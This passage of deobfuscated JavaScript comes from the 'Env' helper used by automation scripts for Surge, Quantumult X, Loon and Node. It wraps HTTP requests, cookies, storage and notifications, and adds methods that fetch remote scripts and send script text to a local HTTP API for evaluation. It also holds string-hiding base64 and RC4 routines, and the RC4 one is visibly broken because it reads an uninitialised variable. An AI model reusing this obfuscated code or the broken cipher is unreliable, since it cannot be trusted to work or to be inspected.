      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](_0x21cd79, _0x13bba3) : this["isQuanX"]() ? $prefs["setValueForKey"](_0x21cd79, _0x13bba3) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x13bba3] = _0x21cd79, this["writedata"](), true) : this["data"] && this["data"][_0x13bba3] || null;
    }

    ["initGotEnv"](_0x54ae71) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      _0x54ae71 && (_0x54ae71["headers"] = _0x54ae71["headers"] ? _0x54ae71["headers"] : {}, void 0 === _0x54ae71["headers"]["Cookie"] && void 0 === _0x54ae71["cookieJar"] && (_0x54ae71["cookieJar"] = this["ckjar"]));
    }

    ["get"](_0x219a8b, _0x2ad7b8 = () => {}) {
      const _0x1848cc = {
        "X-Surge-Skip-Scripting": false
      };
      const _0x24a0c1 = {
        "hints": false
      };
      _0x219a8b["headers"] && (delete _0x219a8b["headers"]["Content-Type"], delete _0x219a8b["headers"]["Content-Length"]);
      this["isSurge"]() || this["isLoon"]() ? (this["isSurge"]() && this["isNeedRewrite"] && (_0x219a8b["headers"] = _0x219a8b["headers"] || {}, Object["assign"](_0x219a8b["headers"], _0x1848cc)), $httpClient["get"](_0x219a8b, (_0x20d842, _0x59d1ed, _0x2658be) => {
        !_0x20d842 && _0x59d1ed && (_0x59d1ed["body"] = _0x2658be, _0x59d1ed["statusCode"] = _0x59d1ed["status"]);

        _0x2ad7b8(_0x20d842, _0x59d1ed, _0x2658be);
      })) : this["isQuanX"]() ? (this["isNeedRewrite"] && (_0x219a8b["opts"] = _0x219a8b["opts"] || {}, Object["assign"](_0x219a8b["opts"], _0x24a0c1)), $task["fetch"](_0x219a8b)["then"](_0x37c6a8 => {
        const {
          "statusCode": _0xf0e34,
          "statusCode": _0x2f15eb,
          "headers": _0x594dfb,
          "body": _0x59050b
        } = _0x37c6a8,
              _0x3846f2 = {
          'status': _0xf0e34,
          'statusCode': _0x2f15eb,
          'headers': _0x594dfb,
          'body': _0x59050b
        };

        _0x2ad7b8(null, _0x3846f2, _0x59050b);
      }, _0x37766b => _0x2ad7b8(_0x37766b))) : this["isNode"]() && (this["initGotEnv"](_0x219a8b), this["got"](_0x219a8b)['on']("redirect", (_0x2682d4, _0x347bef) => {
        try {
          if (_0x2682d4["headers"]["set-cookie"]) {
            const _0xdf06b8 = _0x2682d4["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();

            this["ckjar"]["setCookieSync"](_0xdf06b8, null);
            _0x347bef["cookieJar"] = this["ckjar"];
          }
        } catch (_0x45563c) {
          this["logErr"](_0x45563c);
        }
      })["then"](_0x4a25a3 => {
        const {
          "statusCode": _0x528287,
          "statusCode": _0x5b7294,
          "headers": _0x489fc4,
          "body": _0x2a55f3
        } = _0x4a25a3,
              _0x23ee31 = {
          'status': _0x528287,
          'statusCode': _0x5b7294,
          'headers': _0x489fc4,
          'body': _0x2a55f3
        };

        _0x2ad7b8(null, _0x23ee31, _0x2a55f3);
      }, _0x5f4535 => {
        const {
          "message": _0x4e3dfd,
          "response": _0x19d175
        } = _0x5f4535;

        _0x2ad7b8(_0x4e3dfd, _0x19d175, _0x19d175 && _0x19d175["body"]);
      }));
    }

    ["post"](_0x25f564, _0x57034b = () => {}) {
      const _0x53b574 = {
        "X-Surge-Skip-Scripting": false
      };
      const _0x1b85c9 = {
        "hints": false
      };

      if (_0x25f564["body"] && _0x25f564["headers"] && !_0x25f564["headers"]["Content-Type"] && (_0x25f564["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x25f564["headers"] && delete _0x25f564["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (_0x25f564["headers"] = _0x25f564["headers"] || {}, Object["assign"](_0x25f564["headers"], _0x53b574));
        $httpClient["post"](_0x25f564, (_0x44f8e4, _0x39a42e, _0x2a22a8) => {
          !_0x44f8e4 && _0x39a42e && (_0x39a42e["body"] = _0x2a22a8, _0x39a42e["statusCode"] = _0x39a42e["status"]);

          _0x57034b(_0x44f8e4, _0x39a42e, _0x2a22a8);
        });
      } else {
        if (this["isQuanX"]()) {
          _0x25f564["method"] = "POST";
          this["isNeedRewrite"] && (_0x25f564["opts"] = _0x25f564["opts"] || {}, Object["assign"](_0x25f564["opts"], _0x1b85c9));
          $task["fetch"](_0x25f564)["then"](_0x1d7dcb => {
            const {
              "statusCode": _0x370dc5,
              "statusCode": _0x317abc,
              "headers": _0x285bab,
              "body": _0x2be6b5
            } = _0x1d7dcb,
                  _0x42016d = {
              'status': _0x370dc5,
              'statusCode': _0x317abc,
              'headers': _0x285bab,
              'body': _0x2be6b5
            };

            _0x57034b(null, _0x42016d, _0x2be6b5);
          }, _0x41e1d6 => _0x57034b(_0x41e1d6));
        } else {
          if (this["isNode"]()) {
            this["initGotEnv"](_0x25f564);
            const {
              "url": _0x5b22b0,
              ..._0x2d56e8
            } = _0x25f564;
            this["got"]["post"](_0x5b22b0, _0x2d56e8)["then"](_0x1e9aaf => {
              const {
                "statusCode": _0x520f55,
                "statusCode": _0x31f392,
                "headers": _0xbbb1bd,
                "body": _0x7d5e52
              } = _0x1e9aaf,
                    _0x2504b2 = {
                'status': _0x520f55,
                'statusCode': _0x31f392,
                'headers': _0xbbb1bd,
                'body': _0x7d5e52
              };

              _0x57034b(null, _0x2504b2, _0x7d5e52);
            }, _0xde488c => {
              const {
                "message": _0x1ba103,
                "response": _0x111634
              } = _0xde488c;

              _0x57034b(_0x1ba103, _0x111634, _0x111634 && _0x111634["body"]);
            });
          }
        }
      }
    }

    ["put"](_0x3a6500, _0x58db01 = () => {}) {
      const _0x257e0d = {
        "X-Surge-Skip-Scripting": false
      };
      const _0x1be9c9 = {
        "hints": false
      };

      if (_0x3a6500["body"] && _0x3a6500["headers"] && !_0x3a6500["headers"]["Content-Type"] && (_0x3a6500["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x3a6500["headers"] && delete _0x3a6500["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (_0x3a6500["headers"] = _0x3a6500["headers"] || {}, Object["assign"](_0x3a6500["headers"], _0x257e0d)), $httpClient["put"](_0x3a6500, (_0x5dc443, _0xc21d46, _0x5db61a) => {
          !_0x5dc443 && _0xc21d46 && (_0xc21d46["body"] = _0x5db61a, _0xc21d46["statusCode"] = _0xc21d46["status"]), _0x58db01(_0x5dc443, _0xc21d46, _0x5db61a);
        });
      } else {
        if (this["isQuanX"]()) {
          _0x3a6500["method"] = "PUT";
          this["isNeedRewrite"] && (_0x3a6500["opts"] = _0x3a6500["opts"] || {}, Object["assign"](_0x3a6500["opts"], _0x1be9c9));
          $task["fetch"](_0x3a6500)["then"](_0x2bd449 => {
            const {
              "statusCode": _0x4ee915,
              "statusCode": _0x15c36d,
              "headers": _0x477aee,
              "body": _0xd385af
            } = _0x2bd449,
                  _0x2e775f = {
              'status': _0x4ee915,
              'statusCode': _0x15c36d,
              'headers': _0x477aee,
              'body': _0xd385af
            };

            _0x58db01(null, _0x2e775f, _0xd385af);
          }, _0x2ab5f3 => _0x58db01(_0x2ab5f3));
        } else {
          if (this["isNode"]()) {
            this["initGotEnv"](_0x3a6500);
            const {
              "url": _0x4a6a10,
              ..._0x433416
            } = _0x3a6500;
            this["got"]["put"](_0x4a6a10, _0x433416)["then"](_0xbd3f37 => {
              const {
                "statusCode": _0x4c7d66,
                "statusCode": _0xefcce0,
                "headers": _0x467897,
                "body": _0xdcdff4
              } = _0xbd3f37,
                    _0x1d9c13 = {
                'status': _0x4c7d66,
                'statusCode': _0xefcce0,
                'headers': _0x467897,
                'body': _0xdcdff4
              };

              _0x58db01(null, _0x1d9c13, _0xdcdff4);
            }, _0xc3dad7 => {
              const {
                "message": _0x1fa123,
                "response": _0x5a6ad5
              } = _0xc3dad7;

              _0x58db01(_0x1fa123, _0x5a6ad5, _0x5a6ad5 && _0x5a6ad5["body"]);
            });
          }
        }
      }
    }

    ["time"](_0x510bc2) {
      let _0xbe6c9c = {
        'M+': new Date()["getMonth"]() + 1,
        'd+': new Date()["getDate"](),
        'H+': new Date()["getHours"](),
        'm+': new Date()["getMinutes"](),
        's+': new Date()["getSeconds"](),
        'q+': Math["floor"]((new Date()["getMonth"]() + 3) / 3),
        'S': new Date()["getMilliseconds"]()
      };
      /(y+)/["test"](_0x510bc2) && (_0x510bc2 = _0x510bc2["replace"](RegExp['$1'], (new Date()["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));

      for (let _0x1f4ced in _0xbe6c9c) new RegExp('(' + _0x1f4ced + ')')["test"](_0x510bc2) && (_0x510bc2 = _0x510bc2["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? _0xbe6c9c[_0x1f4ced] : ('00' + _0xbe6c9c[_0x1f4ced])["substr"](('' + _0xbe6c9c[_0x1f4ced])["length"])));

      return _0x510bc2;
    }

    ["msg"](_0x21e0fd = _0x1175a5, _0x3f4b9c = '', _0x2e1645 = '', _0x323e85) {
      const _0x23ad5c = _0x2f29c0 => {
        if (!_0x2f29c0) {
          return _0x2f29c0;
        }

        if ("string" == typeof _0x2f29c0) {
          return this["isLoon"]() ? _0x2f29c0 : this["isQuanX"]() ? {
            'open-url': _0x2f29c0
          } : this["isSurge"]() ? {
            'url': _0x2f29c0
          } : void 0;
        }

        if ("object" == typeof _0x2f29c0) {
          if (this["isLoon"]()) {
            let _0x5b2213 = _0x2f29c0["openUrl"] || _0x2f29c0["url"] || _0x2f29c0["open-url"],
                _0x1be851 = _0x2f29c0["mediaUrl"] || _0x2f29c0["media-url"];

            const _0x41043 = {
              "openUrl": _0x5b2213,
              "mediaUrl": _0x1be851
            };
            return _0x41043;
          }

          if (this["isQuanX"]()) {
            let _0x328f7a = _0x2f29c0["open-url"] || _0x2f29c0["url"] || _0x2f29c0["openUrl"],
                _0x5ce2ba = _0x2f29c0["media-url"] || _0x2f29c0["mediaUrl"];

            const _0x203e7b = {
              "open-url": _0x328f7a,
              "media-url": _0x5ce2ba
            };
            return _0x203e7b;
          }

          if (this["isSurge"]()) {
            let _0x1adb19 = _0x2f29c0["url"] || _0x2f29c0["openUrl"] || _0x2f29c0["open-url"];

            const _0x189c1e = {
              "url": _0x1adb19
            };
            return _0x189c1e;
          }
        }
      };

      this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](_0x21e0fd, _0x3f4b9c, _0x2e1645, _0x23ad5c(_0x323e85)) : this["isQuanX"]() && $notify(_0x21e0fd, _0x3f4b9c, _0x2e1645, _0x23ad5c(_0x323e85)));
      let _0x55c319 = ['', "==============📣系统通知📣=============="];

      _0x55c319["push"](_0x21e0fd);

      _0x3f4b9c && _0x55c319["push"](_0x3f4b9c);
      _0x2e1645 && _0x55c319["push"](_0x2e1645);
      console["log"](_0x55c319["join"]("\n"));
      this["logs"] = this["logs"]["concat"](_0x55c319);
    }

    ["log"](..._0x26f1fd) {
      _0x26f1fd["length"] > 0 && (this["logs"] = [...this["logs"], ..._0x26f1fd]);
      console["log"](_0x26f1fd["join"](this["logSeparator"]));
    }

    ["logErr"](_0x3f0f6a, _0x23f236) {
      const _0x2e17e7 = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();

      _0x2e17e7 ? this["log"]('', '❗️' + this["name"] + ", 错误!", _0x3f0f6a["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", _0x3f0f6a);
    }

    ["wait"](_0x5206f3) {
      return new Promise(_0x3991af => setTimeout(_0x3991af, _0x5206f3));
    }

    ["done"](_0x239b89 = {}) {
      const _0x38337e = new Date()["getTime"](),
            _0x225057 = (_0x38337e - this["startTime"]) / 1000;

      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + _0x225057 + " 秒");
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(_0x239b89);
    }

  }(_0x1175a5, _0x4f6465);
}

function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  this["encode"] = function (_0x3b7af2) {
    var _0x39685a = '';

    var _0x998028, _0x738a27, _0x3a61c4, _0x2e8cda, _0x429dff, _0x2670fb, _0x2a9440;

    var _0x45a292 = 0;
    _0x3b7af2 = _utf8_encode(_0x3b7af2);

    while (_0x45a292 < _0x3b7af2["length"]) {
      _0x998028 = _0x3b7af2["charCodeAt"](_0x45a292++);
      _0x738a27 = _0x3b7af2["charCodeAt"](_0x45a292++);
      _0x3a61c4 = _0x3b7af2["charCodeAt"](_0x45a292++);
      _0x2e8cda = _0x998028 >> 2;
      _0x429dff = (_0x998028 & 3) << 4 | _0x738a27 >> 4;
      _0x2670fb = (_0x738a27 & 15) << 2 | _0x3a61c4 >> 6;
      _0x2a9440 = _0x3a61c4 & 63;

      if (isNaN(_0x738a27)) {
        _0x2670fb = _0x2a9440 = 64;
      } else {
        isNaN(_0x3a61c4) && (_0x2a9440 = 64);
      }

      _0x39685a = _0x39685a + _keyStr["charAt"](_0x2e8cda) + _keyStr["charAt"](_0x429dff) + _keyStr["charAt"](_0x2670fb) + _keyStr["charAt"](_0x2a9440);
    }

    return _0x39685a;
  };

  this["decode"] = function (_0x196fbd) {
    var _0x1ff533 = '';

    var _0x9b13a6, _0x2881da, _0x3cafe6;

    var _0x189e01, _0x1bea87, _0x2f926a, _0x2ae425;

    var _0x3dd94e = 0;
    _0x196fbd = _0x196fbd["replace"](/[^A-Za-z0-9\+\/\=]/g, '');

    while (_0x3dd94e < _0x196fbd["length"]) {
      _0x189e01 = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
      _0x1bea87 = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
      _0x2f926a = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
      _0x2ae425 = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
      _0x9b13a6 = _0x189e01 << 2 | _0x1bea87 >> 4;
      _0x2881da = (_0x1bea87 & 15) << 4 | _0x2f926a >> 2;
      _0x3cafe6 = (_0x2f926a & 3) << 6 | _0x2ae425;
      _0x1ff533 = _0x1ff533 + String["fromCharCode"](_0x9b13a6);
      _0x2f926a != 64 && (_0x1ff533 = _0x1ff533 + String["fromCharCode"](_0x2881da));
      _0x2ae425 != 64 && (_0x1ff533 = _0x1ff533 + String["fromCharCode"](_0x3cafe6));
    }

    _0x1ff533 = _utf8_decode(_0x1ff533);
    return _0x1ff533;
  };

  _utf8_encode = function (_0x1442fa) {
    _0x1442fa = _0x1442fa["replace"](/\r\n/g, "\n");
    var _0x43e64d = '';

    for (var _0x234039 = 0; _0x234039 < _0x1442fa["length"]; _0x234039++) {
      var _0x529872 = _0x1442fa["charCodeAt"](_0x234039);

      if (_0x529872 < 128) {
        _0x43e64d += String["fromCharCode"](_0x529872);
      } else {
        _0x529872 > 127 && _0x529872 < 2048 ? (_0x43e64d += String["fromCharCode"](_0x529872 >> 6 | 192), _0x43e64d += String["fromCharCode"](_0x529872 & 63 | 128)) : (_0x43e64d += String["fromCharCode"](_0x529872 >> 12 | 224), _0x43e64d += String["fromCharCode"](_0x529872 >> 6 & 63 | 128), _0x43e64d += String["fromCharCode"](_0x529872 & 63 | 128));
      }
    }

    return _0x43e64d;
  };

  _utf8_decode = function (_0x49f158) {
    var _0x3a475d = '',
        _0x5f3836 = 0,
        _0x23e38a = c1 = c2 = 0;

    while (_0x5f3836 < _0x49f158["length"]) {
      _0x23e38a = _0x49f158["charCodeAt"](_0x5f3836);

      if (_0x23e38a < 128) {
        _0x3a475d += String["fromCharCode"](_0x23e38a), _0x5f3836++;
      } else {
        _0x23e38a > 191 && _0x23e38a < 224 ? (c2 = _0x49f158["charCodeAt"](_0x5f3836 + 1), _0x3a475d += String["fromCharCode"]((_0x23e38a & 31) << 6 | c2 & 63), _0x5f3836 += 2) : (c2 = _0x49f158["charCodeAt"](_0x5f3836 + 1), c3 = _0x49f158["charCodeAt"](_0x5f3836 + 2), _0x3a475d += String["fromCharCode"]((_0x23e38a & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x5f3836 += 3);
      }
    }

    return _0x3a475d;
  };
}

function rc4(_0x11f3e0, _0x53068b) {
  var _0x313075 = Array(256);

  var _0x23d2ce = Array(_0x11f3e0["length"]);

  for (var _0xadbff6 = 0; _0xadbff6 < 256; _0xadbff6++) {
    _0x313075[_0xadbff6] = _0xadbff6;

    var _0x5598d2 = (_0x5598d2 + _0x313075[_0xadbff6] + _0x53068b["charCodeAt"](_0xadbff6 % _0x53068b["length"])) % 256,
        _0x110938 = _0x313075[_0xadbff6];

    _0x313075[_0xadbff6] = _0x313075[_0x5598d2];
    _0x313075[_0x5598d2] = _0x110938;
  }

  for (var _0xadbff6 = 0; _0xadbff6 < _0x11f3e0["length"]; _0xadbff6++) {
    _0x23d2ce[_0xadbff6] = _0x11f3e0["charCodeAt"](_0xadbff6);
  }

  for (var _0x24ce66 = 0; _0x24ce66 < _0x23d2ce["length"]; _0x24ce66++) {
    var _0xadbff6 = (_0xadbff6 + 1) % 256,
        _0x5598d2 = (_0x5598d2 + _0x313075[_0xadbff6]) % 256,
        _0x110938 = _0x313075[_0xadbff6];

    _0x313075[_0xadbff6] = _0x313075[_0x5598d2];
    _0x313075[_0x5598d2] = _0x110938;

    var _0x92a59e = (_0x313075[_0xadbff6] + _0x313075[_0x5598d2] % 256) % 256;

    _0x23d2ce[_0x24ce66] = String["fromCharCode"](_0x23d2ce[_0x24ce66] ^ _0x313075[_0x92a59e]);
  }

  return _0x23d2ce["join"]('');
}

function Envcc(_0x5dbf42, _0x4bce0e) {
  class _0x29cfff {
    constructor(_0x522f73) {
      this["env"] = _0x522f73;
    }

    ["send"](_0x10701d, _0x80d1ef = "GET") {
      _0x10701d = "string" == typeof _0x10701d ? {
        'url': _0x10701d
      } : _0x10701d;
      let _0xb34695 = this["get"];
      "POST" === _0x80d1ef && (_0xb34695 = this["post"]);
      return new Promise((_0x4a3e5, _0x237427) => {
        _0xb34695["call"](this, _0x10701d, (_0xee2d16, _0x14afca, _0x30f944) => {
          _0xee2d16 ? _0x237427(_0xee2d16) : _0x4a3e5(_0x14afca);
        });
      });
    }

    ["get"](_0x43fad9) {
      return this["send"]["call"](this["env"], _0x43fad9);
    }

    ["post"](_0x28a121) {
      return this["send"]["call"](this["env"], _0x28a121, "POST");
    }

  }

  return new class {
    constructor(_0x67432b, _0x2a113e) {
      this["name"] = _0x67432b;
      this["http"] = new _0x29cfff(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["encoding"] = "utf-8";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, _0x2a113e);
      this["log"]('', '🔔' + this["name"] + ", 开始!");
    }

    ["isNode"]() {
      return "undefined" != typeof module && !!module["exports"];
    }

    ["isQuanX"]() {
      return "undefined" != typeof $task;
    }

    ["isSurge"]() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }

    ["isLoon"]() {
      return "undefined" != typeof $loon;
    }

    ["isShadowrocket"]() {
      return "undefined" != typeof $rocket;
    }

    ["toObj"](_0x307360, _0x52872d = null) {
      try {
        return JSON["parse"](_0x307360);
      } catch {
        return _0x52872d;
      }
    }

    ["toStr"](_0x4c7d5f, _0x383b78 = null) {
      try {
        return JSON["stringify"](_0x4c7d5f);
      } catch {
        return _0x383b78;
      }
    }

    ["getjson"](_0x1410c2, _0x456fa1) {
      let _0x291cb3 = _0x456fa1;

      const _0x3e79f6 = this["getdata"](_0x1410c2);

      if (_0x3e79f6) {
        try {
          _0x291cb3 = JSON["parse"](this["getdata"](_0x1410c2));
        } catch {}
      }

      return _0x291cb3;
    }

    ["setjson"](_0x3f8f58, _0x3b234b) {
      try {
        return this["setdata"](JSON["stringify"](_0x3f8f58), _0x3b234b);
      } catch {
        return false;
      }
    }

    ["getScript"](_0x4a9519) {
      return new Promise(_0x392abc => {
        const _0x434950 = {
          "url": _0x4a9519
        };
        this["get"](_0x434950, (_0x4fcf42, _0xf274e4, _0xbed539) => _0x392abc(_0xbed539));
      });
    }

    ["runScript"](_0x12666b, _0x26d2eb) {
      return new Promise(_0x57e782 => {
        let _0x33194e = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");

        _0x33194e = _0x33194e ? _0x33194e["replace"](/\n/g, '')["trim"]() : _0x33194e;

        let _0x1121e0 = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");

        _0x1121e0 = _0x1121e0 ? 1 * _0x1121e0 : 20;
        _0x1121e0 = _0x26d2eb && _0x26d2eb["timeout"] ? _0x26d2eb["timeout"] : _0x1121e0;

        const [_0x2a1bef, _0x2b480d] = _0x33194e["split"]('@'),
              _0x5d7a1c = {
          'url': "http://" + _0x2b480d + "/v1/scripting/evaluate",
          'body': {
            'script_text': _0x12666b,
            'mock_type': "cron",
            'timeout': _0x1121e0
          },
          'headers': {
            'X-Key': _0x2a1bef,
            'Accept': "*/*"
          }
        };

        this["post"](_0x5d7a1c, (_0x9e89a4, _0x4523e5, _0xb183c6) => _0x57e782(_0xb183c6));
      })["catch"](_0x18a968 => this["logErr"](_0x18a968));
    }

    ["loaddata"]() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");

        const _0x2f9a10 = this["path"]["resolve"](this["dataFile"]),
              _0x221d9d = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              _0xd27659 = this['fs']["existsSync"](_0x2f9a10),
              _0x2e08a9 = !_0xd27659 && this['fs']["existsSync"](_0x221d9d);

        if (!_0xd27659 && !_0x2e08a9) {
          return {};
        }

        {
          const _0x4bf4ac = _0xd27659 ? _0x2f9a10 : _0x221d9d;

          try {
            return JSON["parse"](this['fs']["readFileSync"](_0x4bf4ac));
          } catch (_0x4036fb) {
            return {};
          }
        }
      }
    }

    ["writedata"]() {
      if (this["isNode"]()) {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");

        const _0x305933 = this["path"]["resolve"](this["dataFile"]),
              _0x5aa497 = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              _0x8205f4 = this['fs']["existsSync"](_0x305933),
              _0x2e5717 = !_0x8205f4 && this['fs']["existsSync"](_0x5aa497),
              _0x5358c2 = JSON["stringify"](this["data"]);

        _0x8205f4 ? this['fs']["writeFileSync"](_0x305933, _0x5358c2) : _0x2e5717 ? this['fs']["writeFileSync"](_0x5aa497, _0x5358c2) : this['fs']["writeFileSync"](_0x305933, _0x5358c2);
      }
    }

    ["lodash_get"](_0x1eacfc, _0xb7acb8, _0x244ca7) {
      const _0x12c5d9 = _0xb7acb8["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');

      let _0x27c9e5 = _0x1eacfc;

      for (const _0x226400 of _0x12c5d9) if (_0x27c9e5 = Object(_0x27c9e5)[_0x226400], void 0 === _0x27c9e5) {
        return _0x244ca7;
      }

      return _0x27c9e5;
    }

    ["lodash_set"](_0xdfb14e, _0x2499ea, _0x289057) {
      return Object(_0xdfb14e) !== _0xdfb14e ? _0xdfb14e : (Array["isArray"](_0x2499ea) || (_0x2499ea = _0x2499ea["toString"]()["match"](/[^.[\]]+/g) || []), _0x2499ea["slice"](0, -1)["reduce"]((_0x372da0, _0x5f41b3, _0x467fb3) => Object(_0x372da0[_0x5f41b3]) === _0x372da0[_0x5f41b3] ? _0x372da0[_0x5f41b3] : _0x372da0[_0x5f41b3] = Math["abs"](_0x2499ea[_0x467fb3 + 1]) >> 0 == +_0x2499ea[_0x467fb3 + 1] ? [] : {}, _0xdfb14e)[_0x2499ea[_0x2499ea["length"] - 1]] = _0x289057, _0xdfb14e);
    }

    ["getdata"](_0x11e067) {
      let _0x5cd0f5 = this["getval"](_0x11e067);

      if (/^@/["test"](_0x11e067)) {
        const [, _0x7188c2, _0x120f9b] = /^@(.*?)\.(.*?)$/["exec"](_0x11e067),
              _0x515b56 = _0x7188c2 ? this["getval"](_0x7188c2) : '';

        if (_0x515b56) {
          try {
            const _0x3a72d2 = JSON["parse"](_0x515b56);

            _0x5cd0f5 = _0x3a72d2 ? this["lodash_get"](_0x3a72d2, _0x120f9b, '') : _0x5cd0f5;
          } catch (_0x12676b) {
            _0x5cd0f5 = '';
          }
        }
      }

      return _0x5cd0f5;
    }

    ["setdata"](_0x5da9ed, _0x46b709) {
      let _0x3fc0eb = false;

      if (/^@/["test"](_0x46b709)) {
        const [, _0x59a4e5, _0x2c8eb6] = /^@(.*?)\.(.*?)$/["exec"](_0x46b709),
              _0x4950f0 = this["getval"](_0x59a4e5),
              _0x252809 = _0x59a4e5 ? "null" === _0x4950f0 ? null : _0x4950f0 || '{}' : '{}';

        try {
          const _0x2340c7 = JSON["parse"](_0x252809);

          this["lodash_set"](_0x2340c7, _0x2c8eb6, _0x5da9ed);
          _0x3fc0eb = this["setval"](JSON["stringify"](_0x2340c7), _0x59a4e5);
        } catch (_0x225228) {
          const _0xbbc96e = {};
          this["lodash_set"](_0xbbc96e, _0x2c8eb6, _0x5da9ed);
          _0x3fc0eb = this["setval"](JSON["stringify"](_0xbbc96e), _0x59a4e5);
        }
      } else {
        _0x3fc0eb = this["setval"](_0x5da9ed, _0x46b709);
      }

      return _0x3fc0eb;
    }

    ["getval"](_0x19789c) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](_0x19789c) : this["isQuanX"]() ? $prefs["valueForKey"](_0x19789c) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x19789c]) : this["data"] && this["data"][_0x19789c] || null;
    }

    ["setval"](_0x8e996a, _0x120bc4) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](_0x8e996a, _0x120bc4) : this["isQuanX"]() ? $prefs["setValueForKey"](_0x8e996a, _0x120bc4) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x120bc4] = _0x8e996a, this["writedata"](), true) : this["data"] && this["data"][_0x120bc4] || null;
    }

    ["initGotEnv"](_0x314958) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      _0x314958 && (_0x314958["headers"] = _0x314958["headers"] ? _0x314958["headers"] : {}, void 0 === _0x314958["headers"]["Cookie"] && void 0 === _0x314958["cookieJar"] && (_0x314958["cookieJar"] = this["ckjar"]));
    }

    ["get"](_0x5d1869, _0x3c5085 = () => {}) {
      if (_0x5d1869["headers"] && (delete _0x5d1869["headers"]["Content-Type"], delete _0x5d1869["headers"]["Content-Length"]), this["isSurge"]() || this["isLoon"]()) {
        const _0x473d4a = {
          "X-Surge-Skip-Scripting": false
        };
        this["isSurge"]() && this["isNeedRewrite"] && (_0x5d1869["headers"] = _0x5d1869["headers"] || {}, Object["assign"](_0x5d1869["headers"], _0x473d4a));
        $httpClient["get"](_0x5d1869, (_0x47f4cd, _0x116bdf, _0x30f80e) => {
          !_0x47f4cd && _0x116bdf && (_0x116bdf["body"] = _0x30f80e, _0x116bdf["statusCode"] = _0x116bdf["status"]);

          _0x3c5085(_0x47f4cd, _0x116bdf, _0x30f80e);
        });
      } else {
        if (this["isQuanX"]()) {
          const _0x2b3a0c = {
            "hints": false
          };
          this["isNeedRewrite"] && (_0x5d1869["opts"] = _0x5d1869["opts"] || {}, Object["assign"](_0x5d1869["opts"], _0x2b3a0c));
          $task["fetch"](_0x5d1869)["then"](_0x18a17a => {
            const {
              "statusCode": _0x3e3a97,
              "statusCode": _0x535ff4,
              "headers": _0xd0cbf7,
              "body": _0x43b531
            } = _0x18a17a;
            const _0xd9f138 = {
              "status": _0x3e3a97,
              "statusCode": _0x535ff4,
              "headers": _0xd0cbf7,
              "body": _0x43b531
            };

            _0x3c5085(null, _0xd9f138, _0x43b531);
          }, _0x2c0d22 => _0x3c5085(_0x2c0d22));
        } else {
          if (this["isNode"]()) {
            let _0x336f66 = require("iconv-lite");

            this["initGotEnv"](_0x5d1869);
            this["got"](_0x5d1869)['on']("redirect", (_0x244703, _0x557b22) => {
              try {
                if (_0x244703["headers"]["set-cookie"]) {
                  const _0x58282d = _0x244703["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();

                  _0x58282d && this["ckjar"]["setCookieSync"](_0x58282d, null);
                  _0x557b22["cookieJar"] = this["ckjar"];
                }
              } catch (_0x3b19d9) {
                this["logErr"](_0x3b19d9);
              }
            })["then"](_0x5d1593 => {
              const {
                "statusCode": _0x1e6aa7,
                "statusCode": _0x28af25,
                "headers": _0x175615,
                "rawBody": _0x279d5d
              } = _0x5d1593;
              const _0xfed38 = {
                "status": _0x1e6aa7,
                "statusCode": _0x28af25,
                "headers": _0x175615,
                "rawBody": _0x279d5d
              };

              _0x3c5085(null, _0xfed38, _0x336f66["decode"](_0x279d5d, this["encoding"]));
            }, _0x5c318a => {
              const {
                "message": _0x20d9cf,
                "response": _0x2538d7
              } = _0x5c318a;

              _0x3c5085(_0x20d9cf, _0x2538d7, _0x2538d7 && _0x336f66["decode"](_0x2538d7["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    ["post"](_0x4f1349, _0x2c1931 = () => {}) {
